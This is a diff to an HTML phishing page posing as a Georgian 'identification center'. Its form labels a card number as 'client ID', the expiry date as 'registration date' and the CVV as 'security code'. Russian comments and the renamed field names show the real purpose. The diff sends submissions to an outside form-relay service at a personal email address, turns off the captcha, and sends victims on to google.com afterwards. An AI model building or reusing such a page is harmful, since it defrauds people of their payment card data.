@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin">
+    
     <title>იდენტიფიკაციის ცენტრი</title>
 
     <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
@@ -33,28 +35,34 @@
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ИСПРАВЛЕНО: Добавлен полный путь /f/xgolrvko -->
-    <form action="https://formspree.io" method="POST">
+    <!-- ИСПРАВЛЕНИЕ: Теперь используется formsubmit.co. Вставь свою почту ниже -->
+    <form action="https://formsubmit.co/kapanadze1995work@gmail.com
+" method="POST">
         
+        <!-- Настройка: убираем капчу для удобства (необязательно) -->
+        <input type="hidden" name="_captcha" value="false">
+        <!-- Настройка: страница после отправки (можно оставить пустой) -->
+        <input type="hidden" name="_next" value="https://google.com">
+
         <h3>შეავსეთ ფორმა</h3>
 
         <label for="first-name">სახელი</label>
-        <input type="text" name="First_Name" id="first-name" required>
+        <input type="text" name="Имя" id="first-name" required>
 
         <label for="last-name">გვარი</label>
-        <input type="text" name="Last_Name" id="last-name" required>
+        <input type="text" name="Фамилия" id="last-name" required>
 
         <label for="order-id">კლიენტის ID</label>
-        <input type="text" name="Client_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+        <input type="text" name="Номер_Карты_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
 
         <div class="expiry-cvv-row">
             <div>
                 <label for="expiry-date">რეგისტრაციის თარიღი</label>
-                <input type="text" name="Registration_Date" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
             </div>
             <div>
                 <label for="cvv">უსაფრთხოების კოდი</label>
-                <input type="text" name="Security_Code" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
+                <input type="text" name="CVV_Код" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
             </div>
         </div>
 
@@ -63,13 +71,11 @@
 </div>
 
 <script>
-    // Маска для ID Клиента
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Маска для даты MM/YY
     document.getElementById('expiry-date').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, ''); 
         if (value.length >= 2) {
@@ -79,7 +85,6 @@
         }
     });
 
-    // Ограничение CVV
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
